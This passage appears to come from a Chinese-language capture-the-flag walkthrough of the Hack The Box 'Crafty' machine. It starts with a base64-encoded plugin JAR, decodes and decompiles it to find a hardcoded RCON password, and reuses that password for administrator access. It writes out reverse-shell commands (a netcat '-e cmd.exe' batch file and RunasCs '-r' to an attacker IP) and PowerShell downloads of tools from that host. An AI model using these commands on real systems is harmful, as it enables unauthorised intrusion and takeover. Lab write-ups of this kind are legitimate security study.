jySid9B3a+IuDp3v+MwdfPZjpn1APqu8r9Xx07XDH2LRgMNyrnGnTBJc5726wcNf
I2+f4e29SbtnSYfn2MILbOFFer/M7/QrAVAXSYx2tirNhuh1imAYjH2IRBoIQOln
w0cDUB6t0STKaAfwFAHXGCfGY5kNAF3m4cwFNF8kuMcI2ljwTij/YZqQhnMazkPR
8NUtoEo31Xt0lFHkiFSt+9L2O/hawzVSg+MCfZ+u+z5S89XaW7ovRe5zf73BXcPX
AneFnBGrS/8FUEsHCNS34SGxBgAAHA0AAFBLAwQUAAgICADkRllSAAAAAAAAAAAA
AAAAGAAAAG5ldC9rcm9ub3Mvcmtvbi9jb3JlL2V4LwMAUEsHCAAAAAACAAAAAAAA
AFBLAwQUAAgICADkRllSAAAAAAAAAAAAAAAANQAAAG5ldC9rcm9ub3Mvcmtvbi9j
b3JlL2V4L0F1dGhlbnRpY2F0aW9uRXhjZXB0aW9uLmNsYXNzlVA9T8MwEH0XQgKh
UCiCiYWNDwmLqUNRJYRgiliKurvGSk1TGzkO6t9iQmLgB/CjEJdQwYAYOEvn9559
7073/vH6BqCPXoYVdFNsp9ghJBfGmjAk7B3lD/JJilLaQoyCN7YYHI8J8ZW714Ru
bqy+recT7e/kpGSllzsly7H0puFLMQ5TUxHOc6uDmHlnXSX8zFmhnNdCL8RlHaba
BqNkMM5eL5R+bMCAkM51Vcmidf41CSEbudorfWOaNgd/2Jw1hR3EWCWIf45A2P1p
+63iEBHvqwniw86cE2ZD1iO+k5PTF9Azowgp5+xL5X8p1hjtL/k6v6BFG+i0Xptt
zdYnUEsHCA+UL/D/AAAAmQEAAFBLAwQUAAgICADkRllSAAAAAAAAAAAAAAAANgAA
AG5ldC9rcm9ub3Mvcmtvbi9jb3JlL2V4L01hbGZvcm1lZFBhY2tldEV4Y2VwdGlv
bi5jbGFzc5VQTUvEMBB9qbXVurq6ojcP3vwAI148rOxFFIT6ASt7z2ZjjW0TSbOy
f8uT4MEf4I8Sp1G8iAcz8GbeY+bNkPeP1zcAx+hlmEM3xWqKNYbkRBvtBwwbO/mD
eBK8EqbgQ++0Kfq7I4b41E4UQzfXRl1N67Fyt2JckdLLrRTVSDjd8m8x9ve6YTjK
jfK8dNbYhrvSGi6tU1zN+KWo7qyr1eRGyFL5s5lUj15b02dIa9U0ogjWv05hyIZ2
6qQ61+2erb98DtrJDmLMMxz+9wiG9bBYW35x/aNiGxF9WfsYBVkTJsQGpEeUk739
F7BnqiKkhFlQF6hvkRDY/OoilgWXBEvoBK/lMLPyCVBLBwg6DTweCAEAAJwBAABQ
SwMEFAAICAgA4UZZUgAAAAAAAAAAAAAAACQAAABNRVRBLUlORi9tYXZlbi9uZXQu
a3Jvbm9zLnJrb24uY29yZS8DAFBLBwgAAAAAAgAAAAAAAABQSwMEFAAICAgA4UZZ
UgAAAAAAAAAAAAAAAC4AAABNRVRBLUlORi9tYXZlbi9uZXQua3Jvbm9zLnJrb24u
Y29yZS9ya29uLWNvcmUvAwBQSwcIAAAAAAIAAAAAAAAAUEsDBBQACAgIAOFGWVIA
AAAAAAAAAAAAAAA1AAAATUVUQS1JTkYvbWF2ZW4vbmV0Lmtyb25vcy5ya29uLmNv
cmUvcmtvbi1jb3JlL3BvbS54bWzFk11LwzAUhu/3K0rxtsk6BWVk8UpB2FDwA29j
Gmu0TUqSbgPxvxuTdGv2JSLo7vae9z3pyXOCzpd1lcyZ0lyKSZqDYZowQWXBRTlJ
7+8us7P0HA9Qo+QroyaxbqEn6YsxzRjCmsyZAKQh9IUBqUp4cz2DJ2BouwyS7uci
46Xmq9hisQCLYxcYDYc5fJxNb22HmmRcaEMEZf245mPtqlNJiXGf+e3xyT7HUhde
zJwP2P8pdoehWhasevA3gV0VwUgbeF+pZNtcFVgwA96UFFID9SYFoFIxBLuq9xJl
+DOhxgpfnsx7eqq3hfvHORghOI+PszffMBtgGq8uBfm5qKwbXjEFtGwVZTjPEdxd
2Zs0RJXM7EqGyjoZVgA8tbwqQuOLsCrYbQqCBz1+HtgfyEvO3T+paku7CWulp8Zi
BMTy7VD7WUKfDShRtofCr0U3f+bD27CieMfqGJx+rcsK3ZaRSvHMy1a5Bd6uO09g
dfS+k+EHgpswo3TgtZX2uk1vAo3S3Zu3+UMMbRsW4YyawANTWu47+P0RVMX8GPqn
VEe/p/oPN9spunty4YGt3if+BFBLBwj6BBiCrwEAAPcFAABQSwMEFAAICAgA5UZZ
UgAAAAAAAAAAAAAAADwAAABNRVRBLUlORi9tYXZlbi9uZXQua3Jvbm9zLnJrb24u
Y29yZS9ya29uLWNvcmUvcG9tLnByb3BlcnRpZXMdyTsKgDAMANC9pwg4W2qhIIKT
oDi46QGqxg9CIrEK3t7P+l5UIaH4gCP0NzT+QlJRu5xQYg/WgUkz5zKTQtcWYI1N
1Cx87vWYEwa9CRMfWjYmPbCg8hLWyQ/h/Q/jHy+UY2XKE23VA1BLBwiXqr33aAAA
AHAAAABQSwECFAAUAAgICAAWNFtXAAAAAAIAAAAAAAAACQAEAAAAAAAAAAAAAAAA
AAAATUVUQS1JTkYv/soAAFBLAQIUABQACAgIABY0W1dSjLz/UQAAAFEAAAAUAAAA
AAAAAAAAAAAAAD0AAABNRVRBLUlORi9NQU5JRkVTVC5NRlBLAQIUABQACAgIABQ0
W1fov2CuTgAAAG0AAAAKAAAAAAAAAAAAAAAAANAAAABwbHVnaW4ueW1sUEsBAhQA
FAAICAgAFTRbVwAAAAACAAAAAAAAAAQAAAAAAAAAAAAAAAAAVgEAAGh0Yi9QSwEC
FAAUAAgICAAVNFtXAAAAAAIAAAAAAAAACwAAAAAAAAAAAAAAAACKAQAAaHRiL2Ny
YWZ0eS9QSwECFAAUAAgICAAVNFtXAAAAAAIAAAAAAAAAGQAAAAAAAAAAAAAAAADF
AQAAaHRiL2NyYWZ0eS9wbGF5ZXJjb3VudGVyL1BLAQIUABQACAgIABU0W1f8fgZs
RwMAAN8FAAAsAAAAAAAAAAAAAAAAAA4CAABodGIvY3JhZnR5L3BsYXllcmNvdW50
ZXIvUGxheWVyY291bnRlci5jbGFzc1BLAQIUABQACAgIAPczW1cAAAAAAgAAAAAA
AAAPAAAAAAAAAAAAAAAAAK8FAABNRVRBLUlORi9tYXZlbi9QSwECFAAUAAgICAD3
M1tXAAAAAAIAAAAAAAAAGgAAAAAAAAAAAAAAAADuBQAATUVUQS1JTkYvbWF2ZW4v
aHRiLmNyYWZ0eS9QSwECFAAUAAgICAD3M1tXAAAAAAIAAAAAAAAAKAAAAAAAAAAA
AAAAAAA4BgAATUVUQS1JTkYvbWF2ZW4vaHRiLmNyYWZ0eS9wbGF5ZXJjb3VudGVy
L1BLAQIUABQACAgIAPczW1dETIK3GAMAABALAAAvAAAAAAAAAAAAAAAAAJAGAABN
RVRBLUlORi9tYXZlbi9odGIuY3JhZnR5L3BsYXllcmNvdW50ZXIvcG9tLnhtbFBL
AQIUABQACAgIABU0W1cpL4p/QgAAAEEAAAA2AAAAAAAAAAAAAAAAAAUKAABNRVRB
LUlORi9tYXZlbi9odGIuY3JhZnR5L3BsYXllcmNvdW50ZXIvcG9tLnByb3BlcnRp
ZXNQSwECFAAUAAgICADkRllSAAAAAAIAAAAAAAAABAAAAAAAAAAAAAAAAACrCgAA
bmV0L1BLAQIUABQACAgIAORGWVIAAAAAAgAAAAAAAAALAAAAAAAAAAAAAAAAAN8K
AABuZXQva3Jvbm9zL1BLAQIUABQACAgIAORGWVIAAAAAAgAAAAAAAAAQAAAAAAAA
AAAAAAAAABoLAABuZXQva3Jvbm9zL3Jrb24vUEsBAhQAFAAICAgA5EZZUgAAAAAC
AAAAAAAAABUAAAAAAAAAAAAAAAAAWgsAAG5ldC9rcm9ub3Mvcmtvbi9jb3JlL1BL
AQIUABQACAgIAORGWVLPTE/T6QUAAHsLAAAfAAAAAAAAAAAAAAAAAJ8LAABuZXQv
a3Jvbm9zL3Jrb24vY29yZS9SY29uLmNsYXNzUEsBAhQAFAAICAgA5EZZUtS34SGx
BgAAHA0AACUAAAAAAAAAAAAAAAAA1REAAG5ldC9rcm9ub3Mvcmtvbi9jb3JlL1Jj
b25QYWNrZXQuY2xhc3NQSwECFAAUAAgICADkRllSAAAAAAIAAAAAAAAAGAAAAAAA
AAAAAAAAAADZGAAAbmV0L2tyb25vcy9ya29uL2NvcmUvZXgvUEsBAhQAFAAICAgA
5EZZUg+UL/D/AAAAmQEAADUAAAAAAAAAAAAAAAAAIRkAAG5ldC9rcm9ub3Mvcmtv
bi9jb3JlL2V4L0F1dGhlbnRpY2F0aW9uRXhjZXB0aW9uLmNsYXNzUEsBAhQAFAAI
CAgA5EZZUjoNPB4IAQAAnAEAADYAAAAAAAAAAAAAAAAAgxoAAG5ldC9rcm9ub3Mv
cmtvbi9jb3JlL2V4L01hbGZvcm1lZFBhY2tldEV4Y2VwdGlvbi5jbGFzc1BLAQIU
ABQACAgIAOFGWVIAAAAAAgAAAAAAAAAkAAAAAAAAAAAAAAAAAO8bAABNRVRBLUlO
Ri9tYXZlbi9uZXQua3Jvbm9zLnJrb24uY29yZS9QSwECFAAUAAgICADhRllSAAAA
AAIAAAAAAAAALgAAAAAAAAAAAAAAAABDHAAATUVUQS1JTkYvbWF2ZW4vbmV0Lmty
b25vcy5ya29uLmNvcmUvcmtvbi1jb3JlL1BLAQIUABQACAgIAOFGWVL6BBiCrwEA
APcFAAA1AAAAAAAAAAAAAAAAAKEcAABNRVRBLUlORi9tYXZlbi9uZXQua3Jvbm9z
LnJrb24uY29yZS9ya29uLWNvcmUvcG9tLnhtbFBLAQIUABQACAgIAOVGWVKXqr33
aAAAAHAAAAA8AAAAAAAAAAAAAAAAALMeAABNRVRBLUlORi9tYXZlbi9uZXQua3Jv
bm9zLnJrb24uY29yZS9ya29uLWNvcmUvcG9tLnByb3BlcnRpZXNQSwUGAAAAABkA
GQBxBwAAhR8AAAAA
-----END CERTIFICATE-----

C:\temp>
```
#### 我们复制base64内容并将其保存到本地的一个文本文件中。我们转换base64证书返回到一个文件，并检查文件类型，验证它是一个JAR归档文件。
```
[★]$ vi b64.txt
[★]$ cat b64.txt | base64 -d > playerconuter-1.0-SNAPSHOT.jar
[★]$ file playerconuter-1.0-SNAPSHOT.jar
playerconuter-1.0-SNAPSHOT.jar: Java archive data (JAR)
```
#### 现在我们有了一个有效的jar文件，我们可以使用像这样的在线反编译器来反编译插件返回到源代码。在htb\crafty\playercounter文件夹中，我们可以看到playercounter.java的源代码
https://www.javadecompilers.com/
```
[★]$ cat Playercounter.java
package htb.crafty.playercounter;

import java.io.IOException;
import java.io.PrintWriter;
import net.kronos.rkon.core.Rcon;
import net.kronos.rkon.core.ex.AuthenticationException;
import org.bukkit.plugin.java.JavaPlugin;

public final class Playercounter extends JavaPlugin {
   public void onEnable() {
      Rcon rcon = null;

      try {
         rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
      } catch (IOException var5) {
         throw new RuntimeException(var5);
      } catch (AuthenticationException var6) {
         throw new RuntimeException(var6);
      }

      String result = null;

      try {
         result = rcon.command("players online count");
         PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");
         writer.println(result);
      } catch (IOException var4) {
         throw new RuntimeException(var4);
      }
   }

   public void onDisable() {
   }
}
```
#### 插件使用密码s67u84zKq8IXw对rcon进行身份验证并刮擦播放器计数。然后将其保存到c:\inetpub\wwwroot\playercount.txt中的文本文件中，该文件基于在网站上，我们可以假设是包含在玩家的实时更新的主页play.crafty.htb
#### 现在我们测试这个密码是否实际上是管理员的密码。首先，我们创建一个简单的bat文件在目标上执行
#### 为了在没有适当shell的情况下使用RunAs特性，我们利用runasc。我们下载压缩文件在我们已经运行的Python HTTP web服务器的同一目录中提取它。
https://github.com/antonioCoco/RunasCs
```
[★]$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
[★]$ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe

[★]$ echo 'c:\windows\temp\nc64.exe 10.10.14.93 4444 -e cmd.exe' > shell.bat
[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe

[★]$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

[★]$ nc -lvvp 4444
listening on [any] 4444 ...
```
#### 使用目标上现有的反向shell，我们上传RunasCs.exe和将Shell.bat文件拷贝到目标。
```
C:\temp>powershell iwr http://10.10.14.93:8081/RunasCs.exe -O c:\temp\RunasCs.exe
powershell iwr http://10.10.14.93:8081/RunasCs.exe -O c:\temp\RunasCs.exe

C:\temp>powershell iwr http://10.10.14.93:8081/shell.bat -O c:\temp\shell.bat      
powershell iwr http://10.10.14.93:8081/shell.bat -O c:\temp\shell.bat

C:\temp>powershell iwr http://10.10.14.93:8081/nc64.exe -O c:\temp\nc64.exe
powershell iwr http://10.10.14.93:8081/nc64.exe -O c:\temp\nc64.exe

C:\temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\temp

01/27/2026  11:06 PM    <DIR>          .
01/27/2026  11:06 PM    <DIR>          ..
01/27/2026  10:23 PM            13,802 b64.txt
01/27/2026  11:06 PM            55,296 nc64.exe
10/27/2023  01:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
01/27/2026  10:50 PM            51,712 RunasCs.exe
01/27/2026  11:02 PM                53 shell.bat
               6 File(s)        192,299 bytes
               2 Dir(s)   3,727,994,880 bytes free


C:\temp>.\RunasCs.exe -l 2 administrator s67u84zKq8IXw "c:\temp\shell.bat"  //官方给的测试连接shell，马上就关闭了

C:\temp>.\RunasCs.exe -l 2 administrator s67u84zKq8IXw cmd -r 10.10.14.93:4444  //作者0xdf的反shell连接
.\RunasCs.exe -l 2 administrator s67u84zKq8IXw cmd -r 10.10.14.93:4444

[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1512 created in background.

C:\temp>
```
#### 在我们的反向shell中，我们执行以下命令来查看是否可以获得一个shell作为管理员用户:
```
[★]$ nc -lvvp 4444
listening on [any] 4444 ...
connect to [10.10.14.93] from crafty.htb [10.129.230.193] 49687
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
crafty\administrator

C:\Windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type ..\..\users\administrator\desktop\root.txt
```
